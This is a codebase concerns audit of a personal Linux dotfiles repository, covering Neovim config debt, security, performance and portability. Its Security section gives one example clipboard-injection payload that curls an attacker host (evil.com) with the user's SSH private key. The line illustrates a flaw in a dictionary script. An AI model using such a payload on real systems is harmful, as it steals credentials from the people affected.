# Codebase Concerns

**Analysis Date:** 2026-05-21

## Technical Debt

### High: TODO banners on every Lua file serve no actionable purpose
- **Files:** Every Lua file under `.config/nvim/lua/` has a `--- TODO:` comment on line 1
  - Examples: `.config/nvim/lua/plugins/lsp.lua:1`, `.config/nvim/lua/core/keymaps.lua:1`, `.config/nvim/lua/plugins/snacks.lua:1`, plus all 13 plugin files and all 5 core files
- **Issue:** These `--- TODO:` banners are section headers ("TODO: LSP client setup", "TODO: Misc plugins") but they pollute TODO search results. `rg TODO` returns 21 results — 20 of which are these section banners, making them indistinguishable from real TODOs.
- **Impact:** Real incomplete work gets lost in the noise. Developers scanning for TODOs must filter out 95% false positives.
- **Fix approach:** Remove the `TODO` keyword from section banners. Use a different convention like `--- SECTION:` or `--- ::LSP client setup` — anything that won't match `rg TODO`.

### High: 887-line keymap registry file — single point of fragility
- **File:** `.config/nvim/lua/core/keymaps/registry.lua` (887 lines)
- **Issue:** All 70+ keymaps (global, lazy, buffer, plugin-local) are declared in one monolithic table. This file has become a single source of truth with too much responsibility.
- **Impact:** Any merge conflict in this file blocks all keymap changes. The file is difficult to navigate despite section headers.
- **Fix approach:** Split into domain-specific registry files (e.g., `registry/search.lua`, `registry/git.lua`, `registry/lsp.lua`, `registry/editor.lua`) that each return a subset, then compose them in a thin `registry.lua` that re-exports.

### Medium: DRY violations in keymap module dispatch layer
- **Files:** `.config/nvim/lua/core/keymaps/lazy.lua` (143 lines), `.config/nvim/lua/core/keymaps/attach.lua` (91 lines), `.config/nvim/lua/core/keymaps/apply.lua` (54 lines)
- **Issue:** The `lazy.lua` module has 10 wrapper functions (`search_keys()`, `code_keys()`, `git_keys()`, etc.) that all follow the identical pattern — call `get_keys(domain)`. The `fold_keys()` function duplicates the entire dispatch logic instead of reusing it. The string-action dispatch (`feedkeys` vs `vim.cmd`) is replicated in `lazy.lua` but not shared with `apply.lua`.
- **Impact:** Adding a new action type requires modifying dispatch code in multiple places.
- **Fix approach:** Extract the string-action routing into a shared utility (e.g., `core.keymaps.utils`). Replace the 10 wrapper functions with a single `get_keys(domain)` call. The `fold_keys()` special case could be handled via a plugin-name filter parameter.

### Medium: AGENTS.md references files that no longer exist
- **Files:** `/home/pera/github_repo/.dotfiles/AGENTS.md` references `neo-tree.lua`, `notify.lua` as plugin config files
- **Issue:** The plugin files `.config/nvim/lua/plugins/neotree.lua` and `.config/nvim/lua/plugins/notify.lua` do not exist. These plugins have been migrated to `snacks.nvim` but AGENTS.md was not updated to reflect the current architecture. The STACK.md section within AGENTS.md also references these files.
- **Impact:** Stale documentation misleads developers about the actual architecture.
- **Fix approach:** Update AGENTS.md to reflect current plugin structure — `snacks.nvim` covers file explorer, notifier, and picker functionality. Remove stale references.

### Medium: Complex format_on_save guard with 5 conditional checks
- **File:** `.config/nvim/lua/plugins/conform.lua` lines 15-61
- **Issue:** The `format_on_save` callback has grown 5 guard conditions (buftype, modifiable, bufname, filetype exclusion list, and an `acwrite` exception). The logic is correct but increasingly complex for what started as a simple formatter config.
- **Impact:** Easy to introduce edge-case bugs when adding new filetypes or buffer types to the exclusion list.
- **Fix approach:** Extract the guard logic into a dedicated `core.guards.format` module with unit-testable predicates. Keep `conform.lua` as thin configuration.

### Low: Headless validation script is 773 lines of Bash
- **File:** `/home/pera/github_repo/.dotfiles/scripts/nvim-validate.sh` (773 lines)
- **Issue:** The validation harness uses complex Bash with embedded Lua heredocs, temp file management, and environment variable passing. 7 subcommands with duplicative nvim invocation boilerplate.
- **Impact:** High maintenance burden. Adding a new validation subcommand requires copying ~30 lines of boilerplate. Shell quoting bugs are easy to introduce.
- **Fix approach:** Consider a Lua-based validation runner that uses Neovim's Lua API directly, or consolidate the common `nvim --headless` invocation pattern into a single helper function.

### Low: Comfy line numbers plugin has hardcoded label table
- **File:** `.config/nvim/lua/plugins/misc.lua` lines 50-55
- **Issue:** The `comfy-line-numbers.nvim` opts contain a manually enumerated table of 60 label strings. This is a data-driven config embedded as a literal table.
- **Impact:** Cannot change numbering scheme without editing source code. Table is fragile — mistyping "123" as "12" would silently break.
- **Fix approach:** Generate labels programmatically, or verify upstream plugin supports computed opts.

## Security

### Critical: AccuWeather API key leaked in waybar config comments
- **File:** `/home/pera/github_repo/.dotfiles/.config/waybar/config.jsonc` lines 55-57
- **Issue:** An AccuWeather API key `REDACTED` is hardcoded in comments within the waybar config. This API key is exposed in the public dotfiles repository. Additionally, a curl URL containing the key in query parameters is visible.
- **Impact:** Anyone with this key can make API calls on the owner's behalf (potential abuse/rate-limit exhaustion). The `.gitignore` does not exclude secrets. This is a committed credential leak.
- **Current mitigation:** The AccuWeather API endpoints are commented out and unused (the active weather uses open-meteo which requires no key). But the key is still visible in git history and current HEAD.
- **Fix approach:** 
  1. Immediately revoke/replace the API key at AccuWeather
  2. Remove the commented-out AccuWeather lines from `config.jsonc` (or replace with `YOUR_API_KEY_HERE`)
  3. Add a `.gitleaks.toml` or commit hook to prevent future credential leaks
  4. Consider adding `git filter-repo` to purge the key from git history

### Medium: `define.sh` passes clipboard content to shell without robust sanitization
- **File:** `/home/pera/github_repo/.dotfiles/.config/define.sh` line 3
- **Issue:** The script reads clipboard content via `wl-paste` and passes it directly to `curl` in a URL string. Command injection is possible if clipboard content contains characters like `` ` ``, `$(...)`, or `;` that could break out of the URL context. The only sanitization is a regex check for `/` which rejects forward slashes.
- **Vector:** A malicious website could set clipboard content to something like `"; curl -s http://evil.com/exfiltrate/$(cat ~/.ssh/id_rsa)"` which would pass the `/` guard and potentially execute arbitrary commands through curl URL parsing.
- **Impact:** Clipboard-based command injection when the user triggers `define` (mapped to `$mainMod + d` in Hyprland).
- **Fix approach:** Use `jq --arg` to pass the word as a structured JSON string parameter, avoiding shell interpolation entirely. Add a more comprehensive sanitization whitelist (alphanumeric and common punctuation only).

### Low: `clone_repo.sh` relies on `gh` CLI authentication
- **File:** `/home/pera/github_repo/.dotfiles/scripts/clone_repo.sh` line 5
- **Issue:** Uses `gh repo list` and `gh repo clone` which pull authentication from the system keychain. No fallback or error handling if `gh` is not authenticated. The script will silently fail with auth errors.
- **Impact:** Non-obvious failure mode — user runs script, gets "no repos found" instead of "please authenticate gh CLI".
- **Fix approach:** Add authentication check: `gh auth status 2>/dev/null || { echo "gh not authenticated"; exit 1; }`.

### Low: Hardcoded paths in waybar/quickshell scripts
- **Files:** Multiple `.sh` files under `.config/waybar/scripts/` and `.config/quickshell/services/*.qml`
- **Issue:** Scripts use hardcoded `$HOME/.config/waybar/scripts/...` paths instead of deriving from script location (e.g., `dirname "$0"` pattern). If the dotfiles are symlinked or installed via a different mechanism, these paths break.
- **Impact:** Reduced portability across installation methods.

## Performance

### Medium: Two eagerly-loaded high-priority plugins block startup
- **Files:** `.config/nvim/lua/plugins/snacks.lua:4-5` (`lazy = false`, `priority = 1000`), `.config/nvim/lua/plugins/colortheme.lua:5-6` (`lazy = false`, `priority = 1000`)
- **Issue:** Both `snacks.nvim` and `catppuccin/nvim` are loaded eagerly at Neovim startup. Snacks is a large plugin with many submodules (picker, notifier, dashboard, indent, scroll, words, explorer, lazygit, quickfile, image, terminal, zen). Even with most features enabled, eager loading adds measurable startup latency.
- **Impact:** Startup time is increased by loading features not immediately needed. The picker, explorer, and lazygit features are only needed on keypress, not at startup.
- **Fix approach:** Mark `catppuccin/nvim` as lazy with event "UIEnter" (colorscheme only needed after colors are set). For snacks, evaluate if `keys` lazy-loading (already configured) can be combined with `event = "VeryLazy"` instead of `lazy = false`.

### Medium: Gitsigns `current_line_blame = true` has CPU cost
- **File:** `.config/nvim/lua/plugins/git.lua` line 34
- **Issue:** `current_line_blame = true` runs a git blame query on every cursor move/idle event. The `update_debounce = 5` (line 35) is very aggressive — only 5ms debounce.
- **Impact:** On large git repositories, the blame computation triggers a subprocess every time the cursor stops moving, which can cause visible UI lag. The 5ms debounce is essentially no debounce at all.
- **Fix approach:** Increase `update_debounce` to a more practical value (250-500ms). Consider adding `current_line_blame_opts = { delay = 500 }` to defer blame computation.

### Medium: Waybar and Quickshell both poll weather at 200s intervals
- **Files:** `.config/waybar/config.jsonc:60` (interval 200), `.config/quickshell/services/WeatherService.qml:13` (interval 200000ms = 200s), `.config/quickshell/services/ForecastService.qml:13` (interval 200000ms)
- **Issue:** Both waybar and Quickshell independently fetch weather data from open-meteo.com. Each weather + forecast poll is an HTTP request. The weather functions.sh caches results, but the cache is file-based and only within the waybar script — Quickshell doesn't share this cache.
- **Impact:** Two separate HTTP requests every 200 seconds for the same data. If both bars are running (waybar and Quickshell), this doubles API traffic and bandwidth.
- **Fix approach:** Unify the weather polling. Since Quickshell is the primary bar, disable the weather modules in waybar, or have Quickshell write to a shared status file that waybar reads.

### Low: Most Quickshell services launch bash subprocesses on timers
- **Files:** `.config/quickshell/services/NetworkService.qml` (10s interval), `PingService.qml` (5s interval), `WeatherService.qml` (200s interval), `ForecastService.qml` (200s interval), `ClockService.qml` (1s interval)
- **Issue:** Each Quickshell service spawns a `bash -c "..."` subprocess on its timer interval. Network polling runs every 10 seconds, ping every 5 seconds. Each subprocess has fork+exec overhead.
- **Impact:** Continuous subprocess creation adds CPU overhead. On battery-powered devices, this drains power unnecessarily.
- **Fix approach:** Use Quickshell's built-in Pipewire/Cpu/Memory services where available instead of shell subprocesses. Increase poll intervals where real-time updates aren't needed.

## Maintainability

### High: Duplicate status bar implementations (Waybar + Quickshell)
- **Files:** `.config/waybar/config.jsonc` (173 lines, full bar config) and `.config/quickshell/BarContent.qml` (86 lines, equivalent bar)
- **Issue:** The system has two entirely separate status bar implementations — one in Waybar (with custom shell scripts) and one in Quickshell (with QML services/widgets). They display identical information (workspaces, CPU, memory, disk, network, ping, weather, clock, music, volume, backlight, notifications, system tray). This is a massive duplication of effort.
- **Impact:** Changes must be made in two places. Inconsistencies are inevitable. Maintenance burden is doubled. The scripts directory contains shared shell scripts, but the scheduling and data flow are separate.
- **Fix approach:** Choose one bar as primary. If Quickshell is the future, deprecate Waybar entirely. If both must coexist, have one delegate to the other's data services.

### Medium: Hardcoded geographic coordinates for weather
- **File:** `/home/pera/github_repo/.dotfiles/.config/waybar/scripts/weather/functions.sh` lines 1-2
- **Issue:** Latitude and longitude are hardcoded to Dhaka, Bangladesh coordinates (`LATITUDE=23.758492, LONGITUDE=90.390055`). These are used in the open-meteo API URL for weather fetching.
- **Impact:** The weather feature is not portable. Any user in a different location must edit Lua files to change coordinates. No environment variable support.
- **Fix approach:** Read coordinates from environment variables (e.g., `WEATHER_LAT`, `WEATHER_LON`) with Dhaka as fallback defaults.

### Medium: Monolithic `nvim-audit-failures.sh` with complex data flow
- **File:** `/home/pera/github_repo/.dotfiles/scripts/nvim-audit-failures.sh` (338 lines)
- **Issue:** This script contains pipe-separated data serialization, manual table formatting in markup, globals via `declare -gA`, and complex deduplication logic. The `derive_owner()` function (lines 169-200) uses fragile grep-based path matching.
- **Impact:** Hard to debug, test, or modify. Bash associative arrays with non-obvious key normalization will likely produce unexpected deduplication.
- **Fix approach:** Rewrite in a language with better data structure support (Python or Lua) that can handle JSON natively, since both `jq` and Neovim are already available.

### Low: `init.lua` monkey-patches Neovim core API
- **File:** `/home/pera/github_repo/.dotfiles/.config/nvim/init.lua` lines 4-10
- **Issue:** The init file patches `vim.treesitter.get_node_text` to guard against stale TSNode objects. While documented and well-intentioned, this monkey-patch globally modifies a Neovim core function at startup.
- **Impact:** If Neovim upstream changes the internal behavior of `get_node_text`, this patch could silently break or cause unexpected behavior. The patch is applied globally for all plugins, not just the one that triggers the bug.
- **Fix approach:** Consider applying the fix only via `nvim-treesitter` configuration callbacks, or upstreaming the guard to Neovim. Document which Neovim version introduces the proper fix.

### Low: ~/ paths in config files reduce portability
- **Files:** `.config/.tmux.conf:1` (`~/.tmux/plugins`), `.config/.zshrc:12` (`$HOME/.oh-my-zsh`), various shell scripts using `$HOME/.config/waybar/...`
- **Issue:** Multiple configs use `~` or `$HOME` paths instead of XDG base directory variables (`$XDG_DATA_HOME`, `$XDG_CONFIG_HOME`). This assumes the user's home directory layout.
- **Impact:** If users want to restructure their home directory (e.g., using `XDG_CONFIG_HOME`), these hardcoded paths break.
- **Fix approach:** Use `~` consistently (acceptable for `$HOME`-based config), but document which paths are assumed. For scripts, derive paths from script location.

## Reliability

### Medium: Headless Neovim startup smoke test can miss runtime errors
- **File:** `/home/pera/github_repo/.dotfiles/scripts/nvim-validate.sh` lines 108-133
- **Issue:** The `cmd_startup` function runs `nvim --headless` with a 50ms deferred `qa!`. It checks for error patterns (Error, E5108, E484, stack traceback) in the log. However, the 50ms defer may exit before async plugin initialization completes (e.g., lazy loading, treesitter parser compilation, Mason install checks).
- **Impact:** A plugin that fails to load asynchronously (after 50ms) would not be caught by this test.
- **Fix approach:** Increase the defer timeout to at least 500ms, or use a Lazy health check that waits for all plugin loading to complete before exiting.

### Medium: `define.sh` clipboard-based dictionary is fragile
- **File:** `/home/pera/github_repo/.dotfiles/.config/define.sh` lines 3-22
- **Issue:** The script reads from `wl-paste --primary` (primary selection) or `wl-paste` (clipboard) as fallback. Primary selection is transient and can change while the user is typing. The `sleep 0.01` is a race condition workaround. The only sanitization is `[[ "$word" =~ [\/] ]]` which rejects slashes but allows shell metacharacters.
- **Impact:** If the user selects text accidentally while triggering the define command, the wrong word is looked up. No fallback if `wl-paste` is unavailable (non-Wayland session).
- **Fix approach:** Prompt for input via `rofi` or `dmenu` instead of silently reading selection. Add proper input sanitization (alphanumeric + spaces/hyphens only).

### Low: `gitsigns` `max_file_length = 40000` silently disables for large files
- **File:** `.config/nvim/lua/plugins/git.lua` line 37
- **Issue:** Git signs are disabled for files over 40,000 lines with no user notification. Large generated files (bundled JS, compiled protobuf, SQL dumps) silently lose git indicators.
- **Impact:** User may not notice git signs are missing for large files and could miss staged/unstaged changes.
- **Fix approach:** Add `problematic_file` section to health check. Consider a more visible indicator when gitsigns is inactive on a buffer.

### Low: Lazy key dispatcher uses `pcall(require, map.plugin)` for routing
- **File:** `.config/nvim/lua/core/keymaps/lazy.lua` lines 23-24
- **Issue:** The `get_keys` function tries `pcall(require, map.plugin)` on every lazy keypress. If the plugin name doesn't match the require path, this silently fails and falls through to checking if `type(map.action) == "function"`.
- **Impact:** If a plugin changes its module name, keymaps silently stop working without error.
- **Fix approach:** Add debug logging when `pcall(require, ...)` succeeds but the module doesn't have the expected action method.

## Cross-Platform Risks

### High: Entire desktop config is Linux/Wayland-only
- **Files:** All under `.config/hypr/`, `.config/quickshell/`, `.config/waybar/`, `.config/rofi/`, `.config/swaync/`
- **Issue:** The Hyprland desktop environment, Quickshell status bar, Waybar, swaync notifications, and rofi app launcher are all Linux-only software with specific Wayland requirements. They will not work on macOS, Windows, or X11-only Linux setups.
- **Impact:** The dotfiles repo claims to be "cross-platform Neovim config" but the desktop config is entirely single-platform. Users on non-Linux systems get no benefit from the desktop config files, which make up the majority of the repo.
- **Fix approach:** This is acceptable if the project scope is "Linux desktop dotfiles with Neovim". Clarify in the README that Neovim config is cross-platform but desktop config (Hyprland/Quickshell/Waybar) is Linux-only. Consider moving desktop config to a separate subdirectory.

### Medium: Hyprland config hardcodes specific monitor names
- **File:** `/home/pera/github_repo/.dotfiles/.config/hypr/hyprland.conf` lines 29-30
- **Issue:** Monitor names `DP-1` and `HDMI-A-2` are hardcoded. The second monitor has a hardcoded scale of `1.5` and transform of `1` (90° rotation). Workspace assignments map specific workspaces to specific monitors.
- **Impact:** This config is non-portable across different hardware setups. Any user with different monitors gets no output or incorrect layout.
- **Fix approach:** Use `preferred,auto,auto` without monitor name and rely on Hyprland's auto-detection, or provide example configs with comments explaining how to configure monitors.

### Medium: `define.sh` uses Wayland-specific clipboard tools
- **File:** `/home/pera/github_repo/.dotfiles/.config/define.sh` line 3
- **Issue:** Uses `wl-paste` which is part of `wl-clipboard`, a Wayland-only utility. On X11 or headless systems, this command does not exist.
- **Impact:** The `<leader>d` keymap in Hyprland will silently fail on X11 sessions.
- **Fix approach:** Add X11 fallback using `xclip -o -selection primary` or `xsel --primary`. Check which clipboard tool is available at runtime.

### Medium: Neovim config requires Neovim >= 0.12 for native LSP API
- **File:** `.config/nvim/lua/config/health.lua` lines 33-34, `.config/nvim/lua/plugins/lsp.lua` lines 42-43
- **Issue:** The config uses `vim.lsp.config()` and `vim.lsp.enable()` which are Neovim 0.12 native APIs. Users on Neovim 0.10 or 0.11 will get LSP errors.
- **Impact:** While the health check detects and reports this, users on older Neovim distributions (Debian stable, Ubuntu LTS) will have a broken editing experience.
- **Fix approach:** Document the minimum Neovim version prominently. Consider a compatibility shim for 0.10/0.11 that falls back to `lspconfig[server_name].setup()`.

### Low: Tmux config assumes `~/.tmux/plugins` path
- **File:** `/home/pera/github_repo/.dotfiles/.config/.tmux.conf` line 1
- **Issue:** TPM (Tmux Plugin Manager) is expected at `~/.tmux/plugins/tpm`. Not all users install TPM to this location. The `XDG_DATA_HOME` convention (`~/.local/share/tmux/plugins`) is increasingly common.
- **Impact:** New dotfiles users must manually install TPM to `~/.tmux/plugins` or edit the config.
- **Fix approach:** Support `$XDG_DATA_HOME/tmux/plugins` as fallback location.

## Dependency Risks

### Medium: 37 Neovim plugins — large dependency surface
- **File:** `/home/pera/github_repo/.dotfiles/.config/nvim/lazy-lock.json` (37 plugin entries)
- **Issue:** 37 pinned plugin dependencies create a large surface area for breaking changes. Any plugin update could break the config. Many plugins have overlapping functionality (e.g., `snacks.nvim` replaces several standalone plugins).
- **Impact:** Plugin updates require coordinated testing. Some plugins may become unmaintained.
- **Fix approach:** Audit whether all 37 plugins are actively needed. `snacks.nvim` already subsumes `fzf-lua`, `indent-blankline`, `neo-tree`, `noice.nvim` functionality — check if further consolidation is possible.

### Medium: `blink.cmp` has Rust native dependency
- **File:** `.config/nvim/lua/plugins/blink-cmp.lua` line 11
- **Issue:** `blink.cmp` uses a Rust fuzzy matcher (`implementation = "prefer_rust"`, line 95). While it falls back to Lua, the Rust binary is compiled during installation (via lazy.nvim or Mason). This requires a Rust toolchain or prebuilt binary matching the architecture.
- **Impact:** On non-standard architectures (ARM SBCs, older CPUs without SSE) or systems without Rust, the Rust binary may fail to compile, silently falling back to the slower Lua implementation without user notification.
- **Fix approach:** Add a health check that reports whether the Rust fuzzy matcher is active or falling back to Lua. Document Rust toolchain as optional dependency.

### Medium: External tool dependency chain for formatters
- **File:** `.config/nvim/lua/plugins/lsp.lua` lines 73-104
- **Issue:** The Mason tool installer ensures 10 formatters + 14 LSP servers. Each of these depends on a runtime (Node.js for prettierd/ts_ls, Python for black/isort, JVM for jdtls, Go for gopls). Some tools (`jdtls`, `clangd`) are very large downloads.
- **Impact:** Initial setup downloads hundreds of MB of LSP servers and formatters. Some may fail to install on constrained systems. Tools may have conflicting transitive dependencies.
- **Fix approach:** Consider splitting the `ensure_installed` list into a "core" subset and "extended" subset, with the health check guiding users to optional tools. Document known installation issues per platform.

### Low: `project.nvim` works around Neovim 0.12 deprecation
- **File:** `.config/nvim/lua/plugins/project.lua` lines 3-11
- **Issue:** `project.nvim` is configured with `detection_methods = {"pattern"}` specifically to avoid calling the deprecated `vim.lsp.buf_get_clients()` API in Neovim 0.12+. This is a workaround for an upstream plugin that hasn't been updated for the new Neovim API.
- **Impact:** If `project.nvim` is abandoned or the maintainer doesn't update for future Neovim versions, this workaround may stop working. Pattern-only detection is limited (can't detect project roots from LSP workspace folders).
- **Fix approach:** Monitor whether `project.nvim` releases a 0.12-compatible update. Evaluate alternatives like `snacks` project integration if it becomes available.

### Low: `blink-emoji.nvim` filetype check may miss edge cases
- **File:** `.config/nvim/lua/plugins/blink-cmp.lua` lines 79-85
- **Issue:** The emoji completion `should_show_items` callback compares `vim.o.filetype` (global setting) rather than `vim.bo[bufnr].filetype` (buffer-local setting). This works correctly only if the user is on the expected buffer when the completion triggers.
- **Impact:** In multi-window layouts, the global `vim.o.filetype` may reflect a different buffer's filetype than the one where completion was triggered, leading to incorrect emoji source filtering.
- **Fix approach:** Capture the buffer number at completion source setup time and use `vim.bo[bufnr].filetype` for the check.

## Missing Critical Features

### Medium: No automated testing framework for Lua config
- **Observation:** The Neovim config has no unit tests for any of the Lua modules. The `scripts/nvim-validate.sh` file does integration-style smoke tests (startup, health, keymap dispatch, format guards) but these are headless Neovim invocation tests, not isolated unit tests.
- **Impact:** Modifications to `registry.lua`, `lazy.lua`, `attach.lua`, or the format guard in `conform.lua` cannot be validated without running the full headless validation suite, which takes seconds per run.
- **Fix approach:** Add `plenary.nvim` or `munifitang` based tests for core logic modules. The keymap routing, format guard, and health probe functions are all testable in isolation.

### Low: No CI pipeline for validation
- **Observation:** The `scripts/nvim-validate.sh` harness exists but there's no GitHub Actions or similar CI config to run it on every PR/commit.
- **Impact:** Breaking changes can be merged without automated validation.
- **Fix approach:** Add a `.github/workflows/validate.yml` that runs `nvim-validate.sh all` in a headless Neovim container.

## Strengths

This concerns document focuses on problems, but it would be incomplete without noting what the codebase does well:

1. **Excellent keymap architecture**: The registry pattern in `core/keymaps/` is a genuinely good design. Separating declaration (`registry.lua`), application (`apply.lua`), lazy compilation (`lazy.lua`), and which-key hints (`whichkey.lua`) into distinct concerns is a maintainable approach.

2. **Thorough error handling in critical paths**: The `LspAttach` handler in `lsp.lua` has 3 guards (client validity, buffer validity, buffer type). The auto-save in `keymaps.lua` has 5 guards. The format-on-save in `conform.lua` has 5 guards. These are well-documented and prevent crashes in edge cases.

3. **Comprehensive health checking**: The `config/health.lua` module with 6 sections (version, required tools, optional tools, plugin load, config guards, known environment gaps) is thorough and user-friendly. The snapshot feature for automation is well-designed.

4. **Cross-platform effort in Neovim config**: Modules like `core/open.lua` use `vim.ui.open()` for cross-platform external file opening. The `vim.fn.stdpath()` calls are platform-agnostic. The Neovim Lua code generally avoids platform-specific patterns.

5. **Extensive inline documentation**: Nearly every file has clear section headers, rationale comments for configuration decisions, and references to design decisions (D-* markers). This makes the config self-documenting.

---

*Concerns audit: 2026-05-21*
